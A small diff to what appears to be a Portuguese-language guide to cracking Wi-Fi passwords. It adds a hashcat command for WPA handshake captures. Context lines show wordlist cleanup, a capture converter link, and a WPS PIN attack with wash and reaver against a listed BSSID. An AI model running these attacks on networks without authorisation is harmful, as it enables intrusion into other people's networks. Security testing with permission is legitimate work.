@@ -29,7 +29,8 @@ Organizando arquivo wordlist customizado: <br>
 <b> sort wordlist.txt | uniq -u > wordlist_final.txt </b> <br> <br>
 O parâmetro PWR é o sinal WIFI. Quando mais perto de 0, melhor o sinal.  <br> <br> <br>
 Pode ser utilizado o hashcat para quebrar a senha: https://hashcat.net/cap2hashcat/ <br>
-Convertendo arquivo .cap para arquivo do hashcat e rodando o hashcat externamente em outro servidor <br> <br> <br>
+Convertendo arquivo .cap para arquivo do hashcat e rodando o hashcat externamente em outro servidor <br> 
+hashcat -m 22000 -w 3 arquivo_convertido wordlist.txt <br> <br> <br>
 <b> FORMA VIA WPS SEM USO DE WORDLIST (Isso só funciona se o roteador estiver configurado para não usar PBC (Push Button Authentication) </b> <br>
 wash --interface wlan0 <br>
 reaver --bssid E4:C0:E2:1C:6E:6B  --channel 10 --interface wlan0 -vvv --no-associate <br>
